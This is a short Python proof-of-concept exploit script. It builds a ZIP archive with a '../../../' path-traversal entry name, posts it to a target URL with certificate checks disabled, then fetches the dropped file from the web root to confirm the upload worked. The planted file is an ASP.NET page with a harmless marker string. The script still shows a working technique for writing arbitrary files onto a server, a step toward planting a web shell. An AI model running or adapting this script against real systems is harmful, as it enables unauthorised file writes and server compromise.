import requests, urllib3, sys, io, zipfile
from urllib.parse import urlparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url      = sys.argv[1]
filename = sys.argv[2]
content  = '<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><% Response.Write("hack test file"); %>'

data = io.BytesIO()
with zipfile.ZipFile(data, mode='w', compression=zipfile.ZIP_DEFLATED) as zipf:
    zipf.writestr(f'../../../{filename}', content)
file_data = data.getvalue()

requests.post(url, file_data, allow_redirects=False, verify=False, timeout=15)

uu = urlparse(url)

url2 = uu.scheme + '://' + uu.netloc + f'/{filename}'
try:
    response=requests.get(url2, verify=False, timeout=15, allow_redirects=False)
    if 'hack' in response.text:
        print(f'[+] upload ok: {url2}')
        print(f'  filecontent: `{content}`')
except:
    print(f'[!] something wrong!')
